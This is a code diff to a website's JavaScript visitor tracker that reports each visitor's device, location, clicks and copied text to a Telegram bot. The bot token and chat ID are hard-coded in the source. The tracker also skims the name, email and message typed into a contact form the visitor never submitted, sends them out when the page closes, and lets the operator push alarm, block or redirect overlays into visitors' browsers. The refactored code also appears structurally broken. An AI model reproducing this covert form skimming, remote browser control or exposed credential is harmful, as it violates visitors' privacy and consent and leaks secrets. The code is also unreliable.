@@ -211,6 +211,7 @@
 
     // Main Tracking Logic
     async function initTracker() {
+        let sendPulse = (t, p, d) => { }; // Default placeholder
         try {
             const sessionID = getSessionID();
             const deviceInfo = getDeviceInfo();
@@ -308,10 +309,12 @@
         }
     }
 
-    // --- TAURUS INTELLIGENCE MODULE ---
+    // --- TAURUS INTELLIGENCE MODULE (Refactored for Summary Reports) ---
     async function setupIntelligence(sessionID, docRef, visitData) {
         let botToken = '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
         let chatId = '6886010817';
+        let sessionLog = [];
+        let infoSent = false;
 
         try {
             if (window.db) {
@@ -323,73 +326,106 @@
             }
         } catch (e) { }
 
-        const sendPulse = async (alertTitle, priority = 'low', extraData = null) => {
+        // Core Sender
+        const dispatchTelegram = (text, priority = 'low', buttons = null) => {
             if (!botToken || !chatId) return;
-            const d = visitData.device;
-            const model = d.model || "Unknown";
-            const source = (typeof visitData.traffic_source === 'object') ? (visitData.traffic_source.source || "Direct") : visitData.traffic_source;
-
-            let text = `🔔 <b>${alertTitle}</b>\n\n`;
-            text += `👤 ${model}\n`;
-            text += `🌍 ${source}`;
-
-            if (visitData.location && visitData.location.city !== 'Unknown') {
-                text += `\n📍 ${visitData.location.city}, ${visitData.location.country_code}`;
-            }
-            if (extraData) text += `\n\n${extraData}`;
-
-            try {
-                const payload = {
-                    chat_id: chatId, text: text, parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: "🔔 Alarm", callback_data: `alarm_${visitData.session_id}` },
-                            { text: "🚫 Block", callback_data: `block_${visitData.session_id}` }],
-                            [{ text: "✅ Unblock", callback_data: `unblock_${visitData.session_id}` }]
-                        ]
-                    }
-                };
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                    keepalive: (priority === 'high')
-                });
-            } catch (e) { }
-
-            // Log to Firestore (Neural Sync)
-            const logToIntelligence = (attempts = 0) => {
-                const activeRef = docRef || (window.db ? db.collection(CONFIG.collection).doc(sessionID) : null);
-                if (activeRef) {
-                    try {
-                        activeRef.collection('intelligence').add({
-                            alert: alertTitle,
-                            data: extraData || {},
-                            timestamp: getSafeTimestamp()
-                        });
-                    } catch (e) { }
-                } else if (attempts < 5) {
-                    setTimeout(() => logToIntelligence(attempts + 1), 2000);
-                }
+            const payload = {
+                chat_id: chatId, text: text, parse_mode: 'HTML',
+                reply_markup: buttons ? { inline_keyboard: buttons } : undefined
             };
-            logToIntelligence();
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true // CRITICAL: Allows sending on page unload
+            }).catch(e => console.error("Telegram Dispatch Error", e));
         };
 
-        // --- TAURUS SECURITY UI MANAGER (Red/Yellow Themes) ---
-        const TaurusSecurityUI = {
-            overlay: null,
-            initialized: false,
-            currentAction: null,
+        sendPulse = async (alertTitle, priority = 'low', extraData = null) => {
+            // 1. ENTRANCE ALERT (Immediate)
+            if (alertTitle === "Neural Link Established" && !infoSent) {
+                infoSent = true;
+                const d = visitData.device;
+                const model = d.model || "Unknown";
+                const source = (typeof visitData.traffic_source === 'object') ? (visitData.traffic_source.source || "Direct") : visitData.traffic_source;
 
-            init() {
-                if (this.initialized) return;
-                const el = document.createElement('div');
-                el.id = 'taurus-security-overlay';
-                el.style = "position:fixed;inset:0;z-index:9999999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.95);backdrop-filter:blur(15px);opacity:0;transition:opacity 0.3s ease;";
+                let text = `🔔 <b>NEW VISITOR DETECTED</b>\n`;
+                text += `🆔 <code>${sessionID.split('_')[1]}</code>\n`;
+                text += `👤 ${model} (${d.os})\n`;
+                text += `🌍 ${source}\n`;
+                if (visitData.location && visitData.location.city !== 'Unknown') {
+                    text += `📍 ${visitData.location.city}, ${visitData.location.country_code}`;
+                }
 
-                // Inject Styles with CSS Variables for Theme Support
-                const style = document.createElement('style');
-                style.innerHTML = `
+                const buttons = [
+                    [{ text: "🔔 Alarm", callback_data: `alarm_${visitData.session_id}` },
+                    { text: "🚫 Block", callback_data: `block_${visitData.session_id}` }],
+                    [{ text: "✅ Unblock", callback_data: `unblock_${visitData.session_id}` }]
+                ];
+
+                dispatchTelegram(text, 'high', buttons);
+                return;
+            }
+
+            // 2. ACTIVITY ACCUMULATION (Queue for Summary)
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            sessionLog.push(`[${time}] ${alertTitle}: ${extraData ? extraData.replace(/<[^>]*>?/gm, '') : ''}`);
+
+            // Also log to Firestore immediately for persistence
+            if (docRef) {
+                docRef.collection('intelligence').add({
+                    alert: alertTitle,
+                    data: extraData || {},
+                    timestamp: getSafeTimestamp()
+                }).catch(() => { });
+            }
+        };
+
+        // 3. EXIT SUMMARY REPORTER
+        const flushSummary = () => {
+            if (sessionLog.length === 0) return;
+
+            let summaryText = `📝 <b>SESSION REPORT</b>\n`;
+            summaryText += `🆔 <code>${sessionID.split('_')[1]}</code>\n`;
+            summaryText += `⏱ Duration: ${Math.floor((Date.now() - (visitData.timestamp || Date.now())) / 1000)}s\n\n`;
+            summaryText += `<b>Activity Log:</b>\n`;
+
+            // Limit log to last 15 actions to fit Telegram limit
+            const recentLogs = sessionLog.slice(-15);
+            recentLogs.forEach(entry => {
+                summaryText += `🔹 ${entry}\n`;
+            });
+
+            if (sessionLog.length > 15) summaryText += `...and ${sessionLog.length - 15} more events.`;
+
+            dispatchTelegram(summaryText, 'high');
+            sessionLog = []; // Clear after send
+        };
+
+        // Trigger on Tab Close / Mobile Switch
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                flushSummary();
+            }
+        });
+    }
+
+
+    // --- TAURUS SECURITY UI MANAGER (Red/Yellow Themes) ---
+    const TaurusSecurityUI = {
+        overlay: null,
+        initialized: false,
+        currentAction: null,
+
+        init() {
+            if (this.initialized) return;
+            const el = document.createElement('div');
+            el.id = 'taurus-security-overlay';
+            el.style = "position:fixed;inset:0;z-index:9999999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.95);backdrop-filter:blur(15px);opacity:0;transition:opacity 0.3s ease;";
+
+            // Inject Styles with CSS Variables for Theme Support
+            const style = document.createElement('style');
+            style.innerHTML = `
                     :root { --taurus-theme: #FFD700; --taurus-theme-dim: rgba(255, 215, 0, 0.5); }
                     
                     @keyframes taurus-ripple {
@@ -401,10 +437,10 @@
                         50% { opacity: 1; text-shadow: 0 0 10px var(--taurus-theme); }
                     }
                 `;
-                document.head.appendChild(style);
+            document.head.appendChild(style);
 
-                // Circular Logo Design
-                el.innerHTML = `
+            // Circular Logo Design
+            el.innerHTML = `
                     <div style="text-align: center; position: relative; width: 100%; padding: 20px;">
                         <!-- Logo Container -->
                         <div style="position: relative; width: 140px; height: 140px; margin: 0 auto 30px auto; display: flex; justify-content: center; align-items: center;">
@@ -453,252 +489,252 @@
                     </div>
                 `;
 
-                document.body.appendChild(el);
-                this.overlay = el;
-                this.initialized = true;
+            document.body.appendChild(el);
+            this.overlay = el;
+            this.initialized = true;
 
-                const btn = el.querySelector('#taurus-action-btn');
-                btn.onclick = () => {
-                    this.hide();
-                    if (this.currentAction) {
-                        this.currentAction();
-                        this.currentAction = null;
-                    }
-                };
-            },
-
-            show(title, subtitle, color, btnText, onAction) {
-                this.init();
-                this.currentAction = onAction || null;
-                const titleEl = this.overlay.querySelector('#taurus-title');
-                const subtitleEl = this.overlay.querySelector('#taurus-subtitle');
-                const btn = this.overlay.querySelector('#taurus-action-btn');
-
-                if (title) titleEl.textContent = title;
-                if (subtitle) subtitleEl.textContent = subtitle;
-                if (btnText === null) btn.style.display = 'none';
-                else {
-                    btn.style.display = 'inline-block';
-                    btn.textContent = btnText || 'ACKNOWLEDGE';
+            const btn = el.querySelector('#taurus-action-btn');
+            btn.onclick = () => {
+                this.hide();
+                if (this.currentAction) {
+                    this.currentAction();
+                    this.currentAction = null;
                 }
+            };
+        },
 
-                // APPLY COLOR THEME
-                const themeColor = color || '#FFD700';
-                const themeDim = color === '#ff4444' ? 'rgba(255, 68, 68, 0.4)' : 'rgba(255, 215, 0, 0.4)';
+        show(title, subtitle, color, btnText, onAction) {
+            this.init();
+            this.currentAction = onAction || null;
+            const titleEl = this.overlay.querySelector('#taurus-title');
+            const subtitleEl = this.overlay.querySelector('#taurus-subtitle');
+            const btn = this.overlay.querySelector('#taurus-action-btn');
 
-                if (this.overlay) {
-                    this.overlay.style.setProperty('--taurus-theme', themeColor);
-                    this.overlay.style.setProperty('--taurus-theme-dim', themeDim);
-                    // Also set on root to be safe
-                    document.documentElement.style.setProperty('--taurus-theme', themeColor);
-                    document.documentElement.style.setProperty('--taurus-theme-dim', themeDim);
-                }
-
-                this.overlay.style.display = 'flex';
-                requestAnimationFrame(() => {
-                    this.overlay.style.opacity = '1';
-                });
-            },
-
-            hide() {
-                if (this.overlay) {
-                    this.overlay.style.opacity = '0';
-                    setTimeout(() => {
-                        this.overlay.style.display = 'none';
-                    }, 400);
-                }
-            }
-        };
-
-        function startRemoteControl(ref) {
-            let alarmAudio = null;
-            let lastProcessedId = null;
-            const sessionId = ref.id;
-
-            function playAlarmSound(loop = false) {
-                if (!alarmAudio) {
-                    alarmAudio = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
-                    alarmAudio.loop = true;
-                }
-                alarmAudio.play().catch(e => console.log("Audio blocked", e));
+            if (title) titleEl.textContent = title;
+            if (subtitle) subtitleEl.textContent = subtitle;
+            if (btnText === null) btn.style.display = 'none';
+            else {
+                btn.style.display = 'inline-block';
+                btn.textContent = btnText || 'ACKNOWLEDGE';
             }
 
-            function stopAlarm() {
-                if (alarmAudio) {
-                    alarmAudio.pause();
-                    alarmAudio.currentTime = 0;
+            // APPLY COLOR THEME
+            const themeColor = color || '#FFD700';
+            const themeDim = color === '#ff4444' ? 'rgba(255, 68, 68, 0.4)' : 'rgba(255, 215, 0, 0.4)';
+
+            if (this.overlay) {
+                this.overlay.style.setProperty('--taurus-theme', themeColor);
+                this.overlay.style.setProperty('--taurus-theme-dim', themeDim);
+                // Also set on root to be safe
+                document.documentElement.style.setProperty('--taurus-theme', themeColor);
+                document.documentElement.style.setProperty('--taurus-theme-dim', themeDim);
+            }
+
+            this.overlay.style.display = 'flex';
+            requestAnimationFrame(() => {
+                this.overlay.style.opacity = '1';
+            });
+        },
+
+        hide() {
+            if (this.overlay) {
+                this.overlay.style.opacity = '0';
+                setTimeout(() => {
+                    this.overlay.style.display = 'none';
+                }, 400);
+            }
+        }
+    };
+
+    function startRemoteControl(ref) {
+        let alarmAudio = null;
+        let lastProcessedId = null;
+        const sessionId = ref.id;
+
+        function playAlarmSound(loop = false) {
+            if (!alarmAudio) {
+                alarmAudio = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
+                alarmAudio.loop = true;
+            }
+            alarmAudio.play().catch(e => console.log("Audio blocked", e));
+        }
+
+        function stopAlarm() {
+            if (alarmAudio) {
+                alarmAudio.pause();
+                alarmAudio.currentTime = 0;
+            }
+        }
+
+        // POLLING MECHANISM
+        console.log("📡 Remote Control: Starting Poll Loop...");
+        setInterval(async () => {
+            let data = {};
+            try {
+                const res = await fetch(`${window.location.origin}/api/gateway?action=check_command&sessionId=${sessionId}&t=${Date.now()}`);
+                if (res.ok) {
+                    data = await res.json();
+                } else {
+                    throw new Error("API_FAIL");
+                }
+            } catch (e) {
+                // LOCAL FALLBACK: Direct Firestore
+                if (typeof firebase !== 'undefined') {
+                    try {
+                        const db = firebase.firestore();
+                        const doc = await db.collection('visitors_v1').doc(sessionId).get();
+                        if (doc.exists) data = doc.data();
+                    } catch (err) { }
                 }
             }
 
-            // POLLING MECHANISM
-            console.log("📡 Remote Control: Starting Poll Loop...");
-            setInterval(async () => {
-                let data = {};
-                try {
-                    const res = await fetch(`${window.location.origin}/api/gateway?action=check_command&sessionId=${sessionId}&t=${Date.now()}`);
-                    if (res.ok) {
-                        data = await res.json();
-                    } else {
-                        throw new Error("API_FAIL");
-                    }
-                } catch (e) {
-                    // LOCAL FALLBACK: Direct Firestore
-                    if (typeof firebase !== 'undefined') {
-                        try {
-                            const db = firebase.firestore();
-                            const doc = await db.collection('visitors_v1').doc(sessionId).get();
-                            if (doc.exists) data = doc.data();
-                        } catch (err) { }
-                    }
-                }
-
-                if (!data || !data.action) {
-                    if (lastProcessedId) {
-                        console.log("Commands Cleared.");
-                        lastProcessedId = null;
-                        stopAlarm();
-                        TaurusSecurityUI.hide();
-                    }
-                    return;
-                }
-
-                // GENERATE COMPOSITE ID
-                const currentId = data.action_timestamp
-                    ? `${data.action}_${JSON.stringify(data.action_timestamp)}`
-                    : data.action;
-
-                if (currentId === lastProcessedId) return;
-
-                // STALE COMMAND CHECK
-                if (data.action_timestamp) {
-                    let cmdTime;
-                    if (data.action_timestamp._seconds) {
-                        cmdTime = new Date(data.action_timestamp._seconds * 1000).getTime();
-                    } else {
-                        cmdTime = new Date(data.action_timestamp).getTime();
-                    }
-
-                    // Debugging Time
-                    console.log(`⏱ Command Time: ${new Date(cmdTime).toLocaleTimeString()} vs Now: ${new Date().toLocaleTimeString()}`);
-
-                    if (Date.now() - cmdTime > 60000) {
-                        console.warn("⚠️ Stale Command Ignored");
-                        lastProcessedId = currentId;
-                        return;
-                    }
-                }
-
-                console.log("⚡ Command Received:", data.action, "ID:", currentId);
-                lastProcessedId = currentId;
-
-                if (data.action === 'alarm') {
-                    playAlarmSound(true);
-                    TaurusSecurityUI.show(
-                        'ACCESS',
-                        'SUSPENDED',
-                        '#FFD700',
-                        'ACKNOWLEDGE',
-                        () => {
-                            stopAlarm();
-                            fetch('/api/gateway?action=ack_command', {
-                                method: 'POST', body: JSON.stringify({ sessionId: sessionId })
-                            });
-                        }
-                    );
-                }
-                else if (data.action === 'block') {
-                    stopAlarm();
-                    TaurusSecurityUI.show(
-                        'ACCESS',
-                        'DENIED',
-                        '#ff4444',
-                        null,
-                        null
-                    );
-                }
-                else if (data.action === 'unblock') {
+            if (!data || !data.action) {
+                if (lastProcessedId) {
+                    console.log("Commands Cleared.");
+                    lastProcessedId = null;
                     stopAlarm();
                     TaurusSecurityUI.hide();
-                    setTimeout(() => window.location.reload(), 500);
                 }
-                else if (data.action === 'redirect' && data.url) {
-                    window.location.href = data.url;
+                return;
+            }
+
+            // GENERATE COMPOSITE ID
+            const currentId = data.action_timestamp
+                ? `${data.action}_${JSON.stringify(data.action_timestamp)}`
+                : data.action;
+
+            if (currentId === lastProcessedId) return;
+
+            // STALE COMMAND CHECK
+            if (data.action_timestamp) {
+                let cmdTime;
+                if (data.action_timestamp._seconds) {
+                    cmdTime = new Date(data.action_timestamp._seconds * 1000).getTime();
+                } else {
+                    cmdTime = new Date(data.action_timestamp).getTime();
                 }
 
-            } catch (e) { console.error("Poll Error", e); }
-        }, 10000); // Poll every 10 seconds to save Netlify Quota
-    }
+                // Debugging Time
+                console.log(`⏱ Command Time: ${new Date(cmdTime).toLocaleTimeString()} vs Now: ${new Date().toLocaleTimeString()}`);
+
+                if (Date.now() - cmdTime > 60000) {
+                    console.warn("⚠️ Stale Command Ignored");
+                    lastProcessedId = currentId;
+                    return;
+                }
+            }
+
+            console.log("⚡ Command Received:", data.action, "ID:", currentId);
+            lastProcessedId = currentId;
+
+            if (data.action === 'alarm') {
+                playAlarmSound(true);
+                TaurusSecurityUI.show(
+                    'ACCESS',
+                    'SUSPENDED',
+                    '#FFD700',
+                    'ACKNOWLEDGE',
+                    () => {
+                        stopAlarm();
+                        fetch('/api/gateway?action=ack_command', {
+                            method: 'POST', body: JSON.stringify({ sessionId: sessionId })
+                        });
+                    }
+                );
+            }
+            else if (data.action === 'block') {
+                stopAlarm();
+                TaurusSecurityUI.show(
+                    'ACCESS',
+                    'DENIED',
+                    '#ff4444',
+                    null,
+                    null
+                );
+            }
+            else if (data.action === 'unblock') {
+                stopAlarm();
+                TaurusSecurityUI.hide();
+                setTimeout(() => window.location.reload(), 500);
+            }
+            else if (data.action === 'redirect' && data.url) {
+                window.location.href = data.url;
+            }
+
+        } catch (e) { console.error("Poll Error", e); }
+    }, 10000); // Poll every 10 seconds to save Netlify Quota
+}
 
     /** BEHAVIOR INTELLIGENCE **/
     console.log("🧠 Intelligence Module: Active");
 
-    // A. TEXT COPY ALARM
-    window.addEventListener('copy', () => {
-        const selection = document.getSelection().toString();
-        if (selection && selection.length > 5) {
-            sendPulse("Text Copied", 'medium', `<i>"${selection.substring(0, 30)}..."</i>`);
-        }
-    });
-
-    // B. SCROLL DEPTH
-    let reachedBottom = false;
-    window.addEventListener('scroll', () => {
-        if (reachedBottom) return;
-        if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 100) {
-            reachedBottom = true;
-            sendPulse("Full Page Read (100%)", 'medium');
-        }
-    });
-
-    // C. ABANDONED FORM TRACKING
-    const contactForm = document.getElementById('contact-form');
-    if (contactForm) {
-        let formData = { name: '', email: '', message: '' };
-        let formDirty = false;
-        let formSubmitted = false;
-
-        ['name', 'email', 'message'].forEach(id => {
-            const el = document.getElementById(id);
-            if (el) {
-                el.addEventListener('input', (e) => {
-                    formData[id] = e.target.value;
-                    if (e.target.value.length > 0) formDirty = true;
-                });
-            }
-        });
-
-        contactForm.addEventListener('submit', () => { formSubmitted = true; });
-
-        const handleAbandonment = () => {
-            if (formDirty && !formSubmitted) {
-                if (formData.name.length > 2 || formData.email.length > 5 || formData.message.length > 5) {
-                    let abandonDetails = `⚠️ <b>Unsent Draft:</b>\n`;
-                    if (formData.name) abandonDetails += `👤 ${formData.name}\n`;
-                    if (formData.email) abandonDetails += `📧 ${formData.email}\n`;
-                    if (formData.message) abandonDetails += `📝 ${formData.message}`;
-                    sendPulse("Form Abandoned", 'high', abandonDetails);
-                }
-            }
-        };
-        window.addEventListener('beforeunload', handleAbandonment);
-        document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleAbandonment(); });
+// A. TEXT COPY ALARM
+window.addEventListener('copy', () => {
+    const selection = document.getSelection().toString();
+    if (selection && selection.length > 5) {
+        sendPulse("Text Copied", 'medium', `<i>"${selection.substring(0, 30)}..."</i>`);
     }
+});
 
-    // D. CLICK INTELLIGENCE
-    document.addEventListener('click', (e) => {
-        const link = e.target.closest('a');
-        if (!link) return;
-        const href = link.href.toLowerCase();
-        const text = link.innerText.trim() || link.getAttribute('aria-label') || 'Icon';
-        if (href.includes('instagram.com')) sendPulse("Social Interaction", 'low', `📸 Clicked Instagram (${text})`);
-        else if (href.includes('wa.me') || href.includes('whatsapp.com')) sendPulse("Contact Intent", 'medium', `💬 Clicked WhatsApp Link`);
-        else if (href.includes('mailto:')) sendPulse("Contact Intent", 'medium', `📧 Clicked Email Link (${href.replace('mailto:', '')})`);
-        else if (href.includes('facebook.com')) sendPulse("Social Interaction", 'low', `📘 Clicked Facebook`);
+// B. SCROLL DEPTH
+let reachedBottom = false;
+window.addEventListener('scroll', () => {
+    if (reachedBottom) return;
+    if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 100) {
+        reachedBottom = true;
+        sendPulse("Full Page Read (100%)", 'medium');
+    }
+});
+
+// C. ABANDONED FORM TRACKING
+const contactForm = document.getElementById('contact-form');
+if (contactForm) {
+    let formData = { name: '', email: '', message: '' };
+    let formDirty = false;
+    let formSubmitted = false;
+
+    ['name', 'email', 'message'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.addEventListener('input', (e) => {
+                formData[id] = e.target.value;
+                if (e.target.value.length > 0) formDirty = true;
+            });
+        }
     });
 
-    return { sendPulse, startRemoteControl };
+    contactForm.addEventListener('submit', () => { formSubmitted = true; });
+
+    const handleAbandonment = () => {
+        if (formDirty && !formSubmitted) {
+            if (formData.name.length > 2 || formData.email.length > 5 || formData.message.length > 5) {
+                let abandonDetails = `⚠️ <b>Unsent Draft:</b>\n`;
+                if (formData.name) abandonDetails += `👤 ${formData.name}\n`;
+                if (formData.email) abandonDetails += `📧 ${formData.email}\n`;
+                if (formData.message) abandonDetails += `📝 ${formData.message}`;
+                sendPulse("Form Abandoned", 'high', abandonDetails);
+            }
+        }
+    };
+    window.addEventListener('beforeunload', handleAbandonment);
+    document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleAbandonment(); });
 }
 
-    initTracker();
+// D. CLICK INTELLIGENCE
+document.addEventListener('click', (e) => {
+    const link = e.target.closest('a');
+    if (!link) return;
+    const href = link.href.toLowerCase();
+    const text = link.innerText.trim() || link.getAttribute('aria-label') || 'Icon';
+    if (href.includes('instagram.com')) sendPulse("Social Interaction", 'low', `📸 Clicked Instagram (${text})`);
+    else if (href.includes('wa.me') || href.includes('whatsapp.com')) sendPulse("Contact Intent", 'medium', `💬 Clicked WhatsApp Link`);
+    else if (href.includes('mailto:')) sendPulse("Contact Intent", 'medium', `📧 Clicked Email Link (${href.replace('mailto:', '')})`);
+    else if (href.includes('facebook.com')) sendPulse("Social Interaction", 'low', `📘 Clicked Facebook`);
+});
+
+return { sendPulse, startRemoteControl };
+}
+
+initTracker();
 
 }) ();
